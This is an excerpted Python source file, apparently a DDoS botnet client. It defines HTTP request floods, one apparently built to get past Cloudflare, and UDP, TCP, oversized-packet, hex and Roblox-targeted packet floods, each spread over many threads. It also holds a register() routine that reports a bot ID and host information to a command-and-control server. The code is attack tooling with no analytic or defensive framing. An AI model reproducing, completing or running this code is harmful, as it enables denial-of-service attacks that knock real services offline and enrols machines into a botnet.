...
def CFB(url, end_time, port=80, threads=120):
    ...
    def worker():
        ...
        while time.time() < end_time:
            try:
                scraper.get(target, headers={'User-Agent': rand_ua()}, timeout=5)
                scraper.head(target, headers={'User-Agent': rand_ua()}, timeout=5)
            except:
                pass
...
def REQ_attack(url, end_time, port=80, threads=120):
    ...
    def worker():
        ...
        while time.time() < end_time:
            try:
                session.get(target, headers={'User-Agent': rand_ua()}, timeout=5)
                session.head(target, headers={'User-Agent': rand_ua()}, timeout=5)
            except:
                pass
...
def attack_udp(ip, end_time, port=0, size=1024, threads=120):
    def worker():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dport = random.randint(1, 65535) if port == 0 else port
                for _ in range(10):  # mỗi lần gửi 10 packet → tăng hiệu suất
...
def attack_tcp(ip, port, end_time, size=1024, threads=120):
    def worker():
        while time.time() < end_time:
            try:
...
def attack_bigpacket(ip, port, end_time, size_kb=1024, threads=120):
    ...
    def worker():
        ...
        while sockets and time.time() < end_time:
            for sock in sockets[:]:
                try:
                    sock.send(payload)
        ...
        for sock in sockets:
            try: sock.shutdown(socket.SHUT_WR); sock.close()
            except: pass
...
def attack_hex(ip, port, end_time, threads=120):
    ...
    def worker():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(50):  # bơm nhanh hơn
...
def attack_roblox(ip, port, end_time, size=1024, threads=120):
    def worker():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ...
                for _ in range(30):
                    ...
                    packet = bytes.fromhex(hex_part) + data
...
def attack_junk(ip, port, end_time, threads=120):
    payload = b"\x00" * 1024
    ...
    def worker():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(60):  # tăng số packet mỗi lần
                    s.sendto(payload, (ip, port))
                s.close()
            except:
                pass
...
def safe_request(method, url, **kwargs):
    ...
    headers.setdefault('User-Agent', 'Mozilla/5.0 (Compatible Bot)')
...
def register():
    ...
    safe_request("POST", f"{C2_URL}/register", json={"bot_id": BOT_ID, "info": info})
